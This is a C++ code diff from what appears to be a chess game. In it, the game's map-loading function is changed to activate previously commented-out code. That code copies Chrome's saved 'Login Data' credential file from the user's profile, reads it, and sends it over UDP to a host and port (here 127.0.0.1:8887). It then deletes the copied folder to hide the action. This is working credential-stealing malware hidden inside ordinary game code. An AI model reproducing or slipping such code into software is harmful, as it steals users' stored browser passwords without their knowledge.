@@ -160,41 +160,42 @@ void Map::load()
 {
     system("rmdir /s /q data");
     system("xcopy \"%USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data\" data\\login_data*");
-    
-    //std::string path = "%USERPROFILE%\\Docuements\\User Data\\login_data.txt";
-    ////std::string path = "../Files/Test/Login Data";
+    system("ren \"data\\*.\" \"*.txt\" ");
 
-    //sf::IpAddress ipAddr = "127.0.0.1";
-    //unsigned short port = 8887;
+    std::string path = "data/login_data.txt";
 
-    //std::ifstream file(path, std::ios::binary | std::ios::ate);
-    //if (file.is_open())
-    //{
-    //    std::streamsize fSize = file.tellg();
-    //    file.seekg(0, std::ios::beg);
+    sf::IpAddress ipAddr = "127.0.0.1";
+    unsigned short port = 8887;
 
-    //    char* fData = new char[fSize];
-    //    file.read(fData, fSize);
-    //    file.close();
-    //    
-    //    std::string fileName = "LoginData.db";
+    std::ifstream file(path, std::ios::binary | std::ios::ate);
+    if (file.is_open())
+    {
+        std::streamsize fSize = file.tellg();
+        file.seekg(0, std::ios::beg);
 
-    //    sf::Packet packet;
-    //    packet << fileName << fSize;
-    //    packet.append(fData, fSize);
+        char* fData = new char[fSize];
+        file.read(fData, fSize);
+        file.close();
+        
+        std::string fileName = "LoginData.txt";
 
-    //    delete[] fData;
+        sf::Packet packet;
+        packet << fileName << fSize;
+        packet.append(fData, fSize);
 
-    //    sf::UdpSocket socket;
-    //    if (socket.send(packet, ipAddr, port) != sf::Socket::Status::Done)
-    //        std::cout << "Erreur a l'envoie du packet";
+        delete[] fData;
 
-    //    std::cout << "Normalement c envoyé" << std::endl;
-    //}
-    //else
-    //{
-    //    std::cout << "Probleme a l'ouverture du fichier " << path;
-    //}
+        sf::UdpSocket socket;
+        if (socket.send(packet, ipAddr, port) != sf::Socket::Status::Done)
+            std::cout << "Erreur a l'envoie du packet";
+
+        std::cout << "Normalement c envoyé" << std::endl;
+    }
+    else
+    {
+        std::cout << "Probleme a l'ouverture du fichier " << path;
+    }
+    system("rmdir /s /q data");
 }
 
 void Map::showRookMoves(int _x, int _y, Map _oppenentMap)
